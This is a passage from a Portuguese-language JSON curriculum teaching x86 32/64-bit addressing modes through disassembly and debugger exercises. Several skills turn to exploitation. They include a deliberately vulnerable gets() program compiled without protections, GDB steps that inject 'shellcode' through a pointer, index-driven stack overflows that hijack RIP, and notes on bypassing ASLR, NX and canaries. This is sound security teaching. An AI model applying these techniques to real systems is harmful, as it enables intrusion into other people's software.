                                    "Compile programas C simples em 32/64 bits com funções acessando dados absolutos.",
                                    "Use objdump -d -M intel bin32.elf e bin64.elf para comparar desmontagens.",
                                    "Para PE (Windows), gere com MinGW e objdump --disassemble-all.",
                                    "Identifique padrões: [abs_addr] em 32 bits vs. [rip+off] em 64 bits.",
                                    "Teste relocação movendo o binário e re-desmontando."
                                  ],
                                  "verification": "Desmonte 3 binários (ELF32, ELF64, PE64) e anote diferenças em um relatório curto.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "objdump (binutils)",
                                    "MinGW para PE",
                                    "Exemplos de código C/ASM"
                                  ],
                                  "tips": "Use -D para dados se necessário; compare com IDA Free para validação visual.",
                                  "learningObjective": "Aplicar ferramentas para visualizar e comparar modos em formatos reais.",
                                  "commonMistakes": [
                                    "Não especificar arquitetura em objdump",
                                    "Ignorar seções .text vs. .data",
                                    "Confundir relocações dinâmicas"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main() { int x = 0x12345678; return x; }' em 32 bits (gcc -m32 -static) e 64 bits. Desmonte com objdump: em 32 bits, veja MOV eax, 0x12345678; em 64 bits, MOV eax, DWORD PTR [rip + off] apontando para .data.",
                              "finalVerifications": [
                                "Explicar verbalmente por que RIP-relativo melhora ASLR.",
                                "Desmontar um binário desconhecido e identificar modo de endereçamento.",
                                "Converter manualmente um opcode 32 bits para equivalente 64 bits.",
                                "Listar 3 vantagens do RIP-relativo sobre absoluto.",
                                "Detectar uso de endereço absoluto em 64 bits e suas implicações de segurança.",
                                "Comparar tamanhos de instrução em exemplos reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de RIP vs. absoluto (100% correto em exemplos).",
                                "Profundidade da comparação (cobre relocabilidade, segurança, tamanho).",
                                "Uso correto de objdump para ELF/PE em ambas arquiteturas.",
                                "Clareza em explicações e diagramas comparativos.",
                                "Detecção de erros comuns em desmontagens práticas.",
                                "Aplicação a cenários de segurança como bypass ASLR."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender como compiladores geram código.",
                                "Sistemas Operacionais: ASLR e model de memória 32/64 bits.",
                                "Segurança Computacional: Reverse engineering e análise de binários maliciosos.",
                                "Arquitetura de Computadores: Evolução de x86 para x86-64.",
                                "Ferramentas de Desenvolvimento: Uso de binutils em pipelines CI/CD."
                              ],
                              "realWorldApplication": "Em análise de malware, reverse engineers usam essa comparação para detectar binários 32/64 bits, explorar vulnerabilidades em código legado e desenvolver exploits que lidam com ASLR em ambientes mistos, como em ferramentas como Ghidra ou IDA Pro."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.3.2",
                        "name": "Modo de Endereçamento Indireto",
                        "description": "No modo indireto, o endereço de memória é obtido do conteúdo de um registrador, permitindo flexibilidade em acessos dinâmicos, essencial para ponteiros em Assembly 32 e 64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.2.1",
                            "name": "Reconhecer indireto via registrador em x86",
                            "description": "Identificar instruções como MOV eax, [ebx] em 32 bits ou MOV rax, [rbx] em 64 bits, onde o registrador ebx/rbx contém o endereço efetivo para leitura/escrita na memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de endereçamento indireto via registrador",
                                  "subSteps": [
                                    "Definir endereçamento indireto: o operando usa um registrador que contém o endereço de memória efetivo.",
                                    "Diferenciar de endereçamento direto (endereço literal) e imediato (valor constante).",
                                    "Explicar o uso de colchetes [] para indicar indireção em assembly x86.",
                                    "Discutir registradores comuns: EBX/EBP em 32 bits, RBX/RBP em 64 bits.",
                                    "Analisar direção: leitura (MOV reg, [reg_base]) vs escrita (MOV [reg_base], reg)."
                                  ],
                                  "verification": "Escrever uma definição própria e compará-la com referências oficiais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manual (Volume 2)",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Sempre foque no conteúdo do registrador como 'ponteiro' para memória.",
                                  "learningObjective": "Dominar os fundamentos conceituais do modo indireto via registrador.",
                                  "commonMistakes": [
                                    "Confundir [] com valor imediato sem indireção.",
                                    "Ignorar diferenças entre 32 e 64 bits nos registradores."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar a sintaxe específica em assembly x86 32 e 64 bits",
                                  "subSteps": [
                                    "Reconhecer padrão: MOV destino, [fonte_reg] para 32 bits (ex: MOV EAX, [EBX]).",
                                    "Adaptar para 64 bits: MOV RAX, [RBX], notando prefixos R.",
                                    "Listar registradores válidos: base/index como EBX, EBP, ESI, EDI (32 bits); equivalentes R (64 bits).",
                                    "Identificar variações: com deslocamento (ex: MOV EAX, [EBX + 4]), mas focar puro indireto.",
                                    "Praticar leitura de opcodes básicos via tabela de instruções."
                                  ],
                                  "verification": "Classificar 10 instruções aleatórias como indiretas ou não.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta online como Godbolt.org",
                                    "Lista de instruções x86"
                                  ],
                                  "tips": "Procure [reg] imediatamente após a vírgula ou como operando fonte.",
                                  "learningObjective": "Reconhecer padrões sintáticos precisos em ambos os arquiteturas.",
                                  "commonMistakes": [
                                    "Misturar registradores 32/64 bits (E vs R).",
                                    "Confundir com indireto indexado."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar exemplos práticos e diferenciar de outros modos",
                                  "subSteps": [
                                    "Examinar código: MOV EAX, [EBX] onde EBX=0x1000 carrega memória[0x1000].",
                                    "Comparar: MOV EAX, 0x1000 (direto) vs MOV EAX, [EBX] (indireto).",
                                    "Simular execução passo a passo com registradores hipotéticos.",
                                    "Diferenciar de indireto com base+index: [EBX + ESI] vs puro [EBX].",
                                    "Usar debugger para observar registradores e memória em tempo real."
                                  ],
                                  "verification": "Simular 3 execuções manuais e prever resultados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB ou OllyDbg",
                                    "Exemplos de assembly compilados"
                                  ],
                                  "tips": "Desenhe diagramas: reg -> endereço -> valor na memória.",
                                  "learningObjective": "Diferenciar com precisão modos de endereçamento relacionados.",
                                  "commonMistakes": [
                                    "Não verificar conteúdo do registrador antes da indireção.",
                                    "Confundir com instruções de stack (PUSH/POP)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em contextos reais de código binário",
                                  "subSteps": [
                                    "Desmontar binário simples com objdump ou IDA Free.",
                                    "Marcar todas ocorrências de [reg] em um trecho de código.",
                                    "Analisar fluxo: como o registrador é populado antes da indireção.",
                                    "Testar em cenários de segurança: acessos em loops ou funções.",
                                    "Criar quiz próprio com 20 instruções mistas."
                                  ],
                                  "verification": "Identificar corretamente 90% em um conjunto de teste.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Binário de teste em assembly (ex: hello world)",
                                    "Objdump ou NASM"
                                  ],
                                  "tips": "Combine com breakpoints em debugger para validar.",
                                  "learningObjective": "Aplicar reconhecimento em análise de binários reais.",
                                  "commonMistakes": [
                                    "Ignorar contexto: reg deve conter endereço válido.",
                                    "Não distinguir operandos de destino/fonte."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário malicioso: MOV EBX, user_input_address; MOV EAX, [EBX]; Se EBX aponta para buffer, isso lê memória controlada pelo atacante, permitindo vazamento de dados em exploits de ROP.",
                              "finalVerifications": [
                                "Identificar 10/10 instruções indiretas via registrador em código misto.",
                                "Explicar diferença entre MOV EAX, [EBX] e MOV EAX, EBX verbalmente.",
                                "Simular execução de 5 exemplos com valores reais de registradores.",
                                "Diferenciar de modos indexado e baseado em um quiz.",
                                "Analisar trecho de binário real e listar acessos indiretos.",
                                "Prever comportamento em cenários de overflow."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de sintaxe (32/64 bits): 100%.",
                                "Correta diferenciação de modos de endereçamento: 90%+.",
                                "Capacidade de simular execução passo a passo.",
                                "Uso correto de ferramentas como GDB/objdump.",
                                "Explicação conceitual clara e sem erros comuns.",
                                "Aplicação em contexto de segurança computacional."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Equivalente a ponteiros (*ptr = valor; valor = *ptr).",
                                "Sistemas Operacionais: Gerenciamento de memória virtual e page tables.",
                                "Segurança da Informação: Análise de exploits como buffer overflow.",
                                "Engenharia de Software: Otimização de código assembly em compiladores.",
                                "Redes: Inspeção de payloads em tráfego malicioso."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware ou análise forense digital, reconhecer esses padrões permite mapear acessos à memória sensível, detectando vazamentos de dados ou injeções de shellcode em ataques como ROP chains."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.2.2",
                            "name": "Simular execução de indireto em debuggers",
                            "description": "Usar GDB ou x64dbg para rastrear o valor de registradores como EAX/RAX em acessos indiretos, analisando cenários de exploração como injeção de shellcode via ponteiros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de debug com um binário contendo acesso indireto",
                                  "subSteps": [
                                    "Escreva um programa C simples usando ponteiros, ex: int *ptr = buffer; *ptr = 0x41414141;",
                                    "Compile para assembly 32/64 bits com flags de debug: gcc -m32 -g -no-pie -o indirect indirect.c para 32-bit ou gcc -g -no-pie -o indirect64 indirect.c para 64-bit.",
                                    "Abra o binário no GDB (gdb ./indirect) ou x64dbg (para Windows 64-bit).",
                                    "Execute 'disassemble main' ou navegue para função principal para identificar instruções indiretas como mov eax, [ebx] ou mov rax, [rbx].",
                                    "Confirme a presença de modo indireto via listagem de assembly."
                                  ],
                                  "verification": "Verifique se o binário carrega sem erros e exibe instruções indiretas no disassembly.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Compilador GCC",
                                    "GDB ou x64dbg instalado",
                                    "Código-fonte C com ponteiros",
                                    "Terminal ou IDE com debugger"
                                  ],
                                  "tips": "Use -fno-stack-protector e -z execstack para facilitar exploração em exemplos iniciais.",
                                  "learningObjective": "Configurar corretamente um ambiente de debug para análise de assembly indireto.",
                                  "commonMistakes": [
                                    "Compilar sem flags de debug (-g), impedindo símbolos",
                                    "Usar PIE (Position Independent Executable) que complica endereços",
                                    "Ignorar arquitetura (32 vs 64 bits)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar breakpoints e executar até a instrução indireta",
                                  "subSteps": [
                                    "Identifique o endereço da instrução indireta (ex: 0x08048490: mov eax, [ebx]) via 'info registers' ou disassembly.",
                                    "Defina breakpoint: break *0x08048490 ou bp no x64dbg.",
                                    "Execute 'run' ou F9 para rodar até o breakpoint.",
                                    "No breakpoint, liste registradores: info registers ou view registers no x64dbg.",
                                    "Anote valores iniciais de EAX/RAX e o registrador ponteiro (EBX/RBX)."
                                  ],
                                  "verification": "O programa pausa exatamente na instrução indireta, com registradores visíveis.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Binário compilado do Step 1",
                                    "GDB/x64dbg"
                                  ],
                                  "tips": "Use 'si' (step instruction) para avançar uma instrução por vez após o breakpoint.",
                                  "learningObjective": "Dominar controle de execução passo a passo em debuggers para isolar acessos indiretos.",
                                  "commonMistakes": [
                                    "Breakpoint em endereço errado",
                                    "Executar 'next' em vez de 'stepi' para instruções assembly",
                                    "Não pausar antes do dereference"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Rastrear e inspecionar valores de registradores durante o acesso indireto",
                                  "subSteps": [
                                    "Examine o registrador ponteiro: print $ebx ou examine RBX no x64dbg.",
                                    "Inspecione memória no endereço apontado: x/4xb $ebx ou memory view no endereço [rbx].",
                                    "Avance com 'si' e observe mudança em EAX/RAX: print $eax antes/depois.",
                                    "Compare valor carregado de memória com esperado, rastreando fluxo.",
                                    "Repita para múltiplas execuções alterando input para ver variações."
                                  ],
                                  "verification": "Pode descrever com precisão o valor carregado em EAX/RAX da memória indireta.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ambiente do Step 2",
                                    "Exemplos de input variados"
                                  ],
                                  "tips": "Use 'watch $ebx' para breakpoint em escrita no ponteiro.",
                                  "learningObjective": "Rastrear dinamicamente valores em registradores durante dereferenciamento indireto.",
                                  "commonMistakes": [
                                    "Confundir registrador destino (EAX) com ponteiro (EBX)",
                                    "Não examinar memória antes do mov",
                                    "Ignorar endianness em dumps de memória"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular cenário de exploração com injeção de shellcode via ponteiro",
                                  "subSteps": [
                                    "Modifique o ponteiro para apontar para shellcode: set $ebx = 0xdeadbeef (endereço com shellcode).",
                                    "Coloque shellcode na memória: set {int}0xdeadbeef = 0x90909090 (NOPs ou shellcode real).",
                                    "Execute 'continue' ou avance e observe EAX/RAX carregando shellcode.",
                                    "Analise impacto: trace execução pós-indireto para ver controle de fluxo alterado.",
                                    "Teste mitigações como ASLR/NX e como contornar."
                                  ],
                                  "verification": "Exploit simulado carrega shellcode em registrador corretamente sem crash.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Hex editor ou pwntools para shellcode",
                                    "Ambiente desprotegido"
                                  ],
                                  "tips": "Comece com shellcode simples como NOP sled + exit(0).",
                                  "learningObjective": "Aplicar conhecimento para simular vulnerabilidades reais via indireto.",
                                  "commonMistakes": [
                                    "Endereços inválidos causando segfault",
                                    "Shellcode com null bytes em ponteiro",
                                    "Não desabilitar proteções como Canary"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile este C: int main() { char buf[16]; int *ptr = buf; gets(buf); *ptr = 0x41414141; printf('%x', *ptr); } como gcc -m32 -fno-stack-protector -z execstack -o vuln vuln.c. No GDB: break *main+50 (na mov eax,[ebx]), run, examine como [ebx] carrega shellcode injetado via overflow.",
                              "finalVerifications": [
                                "Rastreia EAX/RAX antes/depois de mov indireto sem erros.",
                                "Identifica endereço de memória dereferenciado corretamente.",
                                "Simula injeção de shellcode alterando ponteiro e verifica carga.",
                                "Explica mudança no fluxo devido a valor indireto.",
                                "Detecta ASLR ou NX impactando a simulação.",
                                "Repete em 32 e 64 bits com diferenças notadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de breakpoints (100% hit rate).",
                                "Correta interpretação de dumps de registradores/memória.",
                                "Sucesso na simulação de exploit (shellcode executa).",
                                "Análise escrita de 3+ cenários de exploração.",
                                "Tempo de execução dentro de estimados (±20%).",
                                "Identificação de 2+ erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de ponteiros e overflows.",
                                "Sistemas Operacionais: Gerenciamento de memória e proteções (ASLR, NX).",
                                "Redes: Exploração em payloads remotos via buffer overflows.",
                                "Matemática: Representação binária e endianness em endereços."
                              ],
                              "realWorldApplication": "Em reverse engineering de malwares ou pentests, debuggers como GDB/x64dbg são usados para analisar binários vulneráveis, rastreando ponteiros manipulados em exploits como ROP chains ou shellcode injection em CTFs e auditorias de segurança."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.3.3",
                        "name": "Modo de Endereçamento Indexado",
                        "description": "O modo indexado usa um registrador base mais um deslocamento ou índice escalonado, otimizando acessos a arrays ou estruturas em memória em Assembly x86 32/64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.3.1",
                            "name": "Decodificar sintaxe indexada em Assembly",
                            "description": "Interpretar formas como [ebx + esi*4 + 10] em 32 bits ou [rbx + rcx*8] em 64 bits, calculando endereço efetivo = base + (índice * escala) + deslocamento para análise de código binário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Sintaxe Geral do Modo de Endereçamento Indexado",
                                  "subSteps": [
                                    "Estude a documentação oficial da Intel/AMD para modos de endereçamento em x86/x64, focando na forma [base + index*scale + displacement].",
                                    "Identifique os quatro componentes principais: base (registrador como EBX/RBX), index (ESI/RCX), scale (1,2,4,8) e displacement (constante como +10).",
                                    "Memorize as diferenças entre 32-bit (EBX, ESI*4) e 64-bit (RBX, RCX*8), incluindo tamanho dos registradores.",
                                    "Anote exemplos canônicos de cada variante: base-only, base+index, base+index*scale, full.",
                                    "Desenhe um diagrama da fórmula endereço efetivo = base + (index * scale) + displacement."
                                  ],
                                  "verification": "Crie um fluxograma ou tabela resumindo os componentes e a fórmula, sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86/x64 manuals (Vol. 2)",
                                    "Bloco de notas ou ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Sempre leia da esquerda para direita na sintaxe [reg1 + reg2*scale + disp] para evitar confusão.",
                                  "learningObjective": "Reconhecer e nomear precisamente os componentes da sintaxe indexada em Assembly x86/x64.",
                                  "commonMistakes": [
                                    "Confundir base com index (base é o primeiro reg, index o multiplicado)",
                                    "Ignorar que scale só aceita 1,2,4,8",
                                    "Esquecer que displacement pode ser negativo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dissecar Exemplos em Assembly 32-bit",
                                  "subSteps": [
                                    "Pegue o exemplo [ebx + esi*4 + 10] e identifique: base=EBX, index=ESI, scale=4, disp=10.",
                                    "Liste registradores válidos para 32-bit: base (EAX..EDI exceto ESP), index (exceto EBP/ESP).",
                                    "Escreva 3 variações: [ebx + esi], [ebx + 10], [esi*4 + 10].",
                                    "Use um simulador ou calculadora manual para valores hipotéticos (ex: EBX=0x1000, ESI=5).",
                                    "Compare com sintaxe em código desmontado de um binário simples."
                                  ],
                                  "verification": "Parse corretamente 5 exemplos 32-bit variados, listando componentes em uma tabela.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de código Assembly 32-bit",
                                    "Ferramenta como NASM ou online disassembler (ex: godbolt.org)"
                                  ],
                                  "tips": "Em 32-bit, foque em registradores E* (32-bit), scale comum 4 para arrays de int.",
                                  "learningObjective": "Extrair componentes de sintaxe indexada específica para arquitetura 32-bit.",
                                  "commonMistakes": [
                                    "Usar registradores inválidos como ESP para index",
                                    "Aplicar scale inválido como *3",
                                    "Confundir disp com scale"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dissecar Exemplos em Assembly 64-bit",
                                  "subSteps": [
                                    "Analise [rbx + rcx*8 + 20]: base=RBX, index=RCX, scale=8, disp=20.",
                                    "Note diferenças: registradores R* (64-bit), RIP-relative possível, mas foque indexado.",
                                    "Gere 3 exemplos: [rbx + rcx], [rbx + 0x10], [rcx*8 - 5].",
                                    "Simule com valores 64-bit (ex: RBX=0x100000000, RCX=10).",
                                    "Compare sintaxe 32 vs 64 em um disassembler como objdump."
                                  ],
                                  "verification": "Crie uma tabela comparativa de 4 exemplos 64-bit vs equivalentes 32-bit.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação AMD64",
                                    "GDB ou x64dbg para desmontar binários 64-bit"
                                  ],
                                  "tips": "Scale=8 é comum para arrays de double/pointers em 64-bit; use RAX..RDI exceto RSP/RIP.",
                                  "learningObjective": "Diferenciar e parsear sintaxe indexada em contexto 64-bit.",
                                  "commonMistakes": [
                                    "Misturar registradores 32/64 (ex: usar EBX em 64-bit mode)",
                                    "Esquecer extensões de sinal em disp",
                                    "Ignorar modo de tamanho de endereço"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular Endereços Efetivos e Verificar",
                                  "subSteps": [
                                    "Para [ebx + esi*4 + 10], com EBX=0x1000, ESI=3: calcule 0x1000 + (3*4) + 10 = 0x101C.",
                                    "Repita para 3 cenários 32-bit e 3 em 64-bit, incluindo negativos/disp grande.",
                                    "Use um debugger para carregar código e step-through, verificando EA real.",
                                    "Analise um snippet de binário real: desmonte e calcule EA manual vs tool.",
                                    "Documente discrepâncias potenciais (ex: segmentação em 32-bit protected mode)."
                                  ],
                                  "verification": "Calcule corretamente EA para 6 exemplos mistos, matching com simulador/debugger.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Debugger (GDB, WinDbg)",
                                    "Binários de teste Assembly compilados",
                                    "Calculadora hexadecimal"
                                  ],
                                  "tips": "Sempre converta para hex para precisão; teste edge cases como index=0 ou scale=1.",
                                  "learningObjective": "Aplicar fórmula para calcular endereço efetivo com precisão em ambos modos.",
                                  "commonMistakes": [
                                    "Erro aritmético em hex/dec",
                                    "Overflow em 64-bit calcs",
                                    "Ignorar base zero ou index negativo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário malicioso desmontado: mov eax, [ebx + edi*4 + 0xC]. Com EBX=0x00401000 (heap base), EDI=2 (loop index para array de 4-byte structs): EA = 0x00401000 + (2*4) + 12 = 0x00401018. Isso acessa o terceiro elemento de um array de structs no heap, comum em shellcode para ler dados roubados.",
                              "finalVerifications": [
                                "Parse correto de 5 sintaxes indexadas mistas 32/64 sem erros.",
                                "Cálculo preciso de EA para 4 exemplos com valores dados, em hex.",
                                "Explicação verbal da diferença entre componentes em um diagrama.",
                                "Uso de debugger para validar EA em código real.",
                                "Identificação de 3 usos comuns em binários (ex: array access, table lookup).",
                                "Comparação tabela 32 vs 64-bit registradores válidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão 100% na identificação de base/index/scale/disp.",
                                "Cálculos de EA corretos, incluindo hex e overflow handling.",
                                "SubSteps completos e lógicos em análises.",
                                "Integração correta com contexto de análise binária.",
                                "Ausência de common mistakes listados.",
                                "Clareza em diagramas/tabelas explicativos."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Memória e cache implications de acessos indexados.",
                                "Programação em C: Tradução de arrays/pointers como arr[index] -> [base + index*size].",
                                "Matemática: Aritmética modular e operações em base 16.",
                                "Segurança: Buffer overflows explorando EA errados em exploits.",
                                "Engenharia de Software: Otimização de loops com escalas eficientes."
                              ],
                              "realWorldApplication": "Em análise de malware/reverse engineering, decodificar acessos indexados revela estruturas de dados dinâmicas (ex: parsing de payloads em ransomware), permite detecção de ROP chains via gadgets indexados, e auxilia debugging de crashes por EA inválidos em software legímodo."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.3.2",
                            "name": "Aplicar indexado em cenários de arrays",
                            "description": "Exemplificar acesso a arrays com escalas (1,2,4,8) em x86-64, relacionando com buffer overflows onde índices manipulados alteram fluxo de controle em ELF/PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Modo de Endereçamento Indexado com Escalas em x86-64",
                                  "subSteps": [
                                    "Estude a sintaxe básica: [base + index * scale], onde scale é 1, 2, 4 ou 8.",
                                    "Identifique registradores válidos para base (RBP, RDI, etc.) e index (RAX, RCX, etc.).",
                                    "Analise opcodes em LEA e MOV com escalas usando ferramentas como objdump.",
                                    "Compare com modo base+offset para entender quando usar indexado.",
                                    "Pratique decodificando instruções reais de binários ELF."
                                  ],
                                  "verification": "Decodifique corretamente 5 instruções indexadas de um binário x86-64 usando objdump ou ndisasm.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Intel x86-64 manual (Vol. 2), objdump, ndisasm, exemplo ELF simples.",
                                  "tips": "Use 'objdump -d' para ver disassembly e foque em instruções como mov rax, [rbx + rcx*4 + 8].",
                                  "learningObjective": "Compreender a mecânica de cálculo de endereço com escalas para arrays.",
                                  "commonMistakes": "Confundir scale com multiplier fixo; ignorar restrições de registradores SIB byte."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Acesso a Arrays com Escalas em Assembly",
                                  "subSteps": [
                                    "Escreva um programa NASM que declare um array de inteiros (scale=4) e acesse via [rbp - 16 + rax*4].",
                                    "Compile para x86-64 ELF e verifique com gdb o cálculo de endereço.",
                                    "Teste com diferentes valores de index (RAX=0,1,2) e observe memória dump.",
                                    "Adapte para scale=8 (arrays de doubles) e scale=2 (shorts).",
                                    "Adicione loop para iterar array, usando index auto-incrementado."
                                  ],
                                  "verification": "Execute o binário no GDB; confirme acessos corretos via 'x/10gx $rbp-16' sem crashes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "NASM, ld, GDB, editor de texto, array de teste com valores conhecidos (1,2,4,8,...).",
                                  "tips": "Use 'set $rax=2; ni' no GDB para step-by-step e 'info reg' para checar registradores.",
                                  "learningObjective": "Codificar e debugar acessos indexados para simular arrays reais.",
                                  "commonMistakes": "Off-by-one em index; esquecer alinhamento de scale com tipo de dado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Buffer Overflow via Manipulação de Índices",
                                  "subSteps": [
                                    "Crie um buffer stack de 16 bytes e array adjacente com ponteiro para função (ROP gadget).",
                                    "Use index escalado para acessar buffer: mov [rbp-32 + rcx*1], input; onde rcx controlado.",
                                    "Compile sem stack canaries; injete input que overflow via rcx grande.",
                                    "No GDB, force rcx=20 para overflow e observe sobrescrita do ponteiro.",
                                    "Registre o endereço calculado com 'print $rbp-32 + $rcx*1'."
                                  ],
                                  "verification": "Overflow bem-sucedido altera valor adjacente; confirmado via GDB watchpoint em breakpoint.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "NASM, GDB com 'set disable-randomization on', input fuzzer simples ou python script.",
                                  "tips": "Habilite 'catch throw' no GDB para segmentation faults; use python-gdb para automação.",
                                  "learningObjective": "Demonstrar como índices manipulados causam overflows em acessos indexados.",
                                  "commonMistakes": "Não desabilitar ASLR; usar scale errado para buffer size."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar com Alteração de Fluxo de Controle em ELF/PE",
                                  "subSteps": [
                                    "Identifique return address acima do buffer em stack frame x86-64.",
                                    "Modifique código para overflow indexado sobrescrita RIP via ponteiro function.",
                                    "Gere binário ELF e PE (usando MinGW); compare layouts com readelf/objdump.",
                                    "Execute exploit: input overflow muda fluxo para shellcode ou gadget.",
                                    "Analise com pwndbg ou WinDbg para confirmar hijack de controle."
                                  ],
                                  "verification": "Binário ELF/PE executa código alternativo pós-overflow; fluxo alterado sem crash imediato.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "NASM, ld (ELF), MinGW (PE), pwndbg/GDB, WinDbg, ROPgadget para gadgets.",
                                  "tips": "Para PE, use 'objdump -M intel' ; teste em VM para isolamento.",
                                  "learningObjective": "Conectar acessos indexados a exploits reais de controle de fluxo.",
                                  "commonMistakes": "Ignorar prologue/epilogue stack; diferenças ABI entre ELF (SysV) e PE (MS)."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Avaliar e Refinar o Cenário Completo",
                                  "subSteps": [
                                    "Combine steps anteriores em exploit completo com input controlado.",
                                    "Adicione mitigações (canary) e mostre bypass via leak indexado.",
                                    "Documente disassembly antes/depois overflow.",
                                    "Teste em múltiplos cenários: loop bounds check falho.",
                                    "Crie relatório com screenshots GDB."
                                  ],
                                  "verification": "Exploit consistente em 3 runs; relatório cobre todas escalas e formatos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Todos anteriores + Markdown para relatório, Volatility para análise memória.",
                                  "tips": "Use 'gef-pwndbg' plugins para visualização stack/heap.",
                                  "learningObjective": "Integrar conceitos em análise de vulnerabilidades completa.",
                                  "commonMistakes": "Não testar edge cases como index negativo ou max scale."
                                }
                              ],
                              "practicalExample": "Em um binário ELF x86-64, buffer char buf[16] no stack seguido de ponteiro para win(). Instrução mov [rbp-48 + rsi*1], al onde rsi=20 (user-controlled) overflows, sobrescrita ponteiro para endereço de shellcode, hijack RIP ao ret.",
                              "finalVerifications": [
                                "Decodifica instruções indexadas com scale correta em qualquer binário.",
                                "Implementa array access sem leaks/mem errors em GDB.",
                                "Simula overflow manipulando index, alterando memória adjacente.",
                                "Demonstra hijack de controle em ELF e PE.",
                                "Explica relação com buffer overflows em relatório escrito.",
                                "Identifica mitigações e bypass potenciais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe SIB byte e cálculo de endereço (90% correto).",
                                "Código assembly compila/executa sem erros em múltiplas scales.",
                                "Exploit altera fluxo comprovadamente em debugger.",
                                "Análise cobre ELF vs PE diferenças.",
                                "Relatório inclui diagrams e disassemblies claros.",
                                "Criatividade em variações (e.g., scale=8 para structs)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender arrays como ponte para assembly.",
                                "Sistemas Operacionais: Stack layout e ASLR/Canaries.",
                                "Criptografia: Side-channels via timing de acessos indexados.",
                                "Redes: Exploits remotos via buffer overflows em servers."
                              ],
                              "realWorldApplication": "Análise de malwares como EternalBlue (WannaCry), onde índices manipulados em parsers causam overflows; CTFs como pwn.college; auditorias de segurança em binários legacy para patches."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.3.3.3",
                            "name": "Diferenciar indexado de outros modos",
                            "description": "Comparar com direto/indireto, destacando uso de SIB byte em codificação x86 para modos complexos, via desmontagem em ferramentas de engenharia reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Modos de Endereçamento Básicos em x86",
                                  "subSteps": [
                                    "Estude o modo direto: operandos especificados diretamente por endereço de memória fixa (ex: mov eax, [0x1000]).",
                                    "Revise modo indireto/register indirect: usa registrador como ponteiro (ex: mov eax, [ebx]).",
                                    "Identifique modo baseado: endereço com deslocamento fixo de registrador base (ex: mov eax, [ebx + 10]).",
                                    "Compare com modo relativo: usado em jumps, mas foque em operandos de memória.",
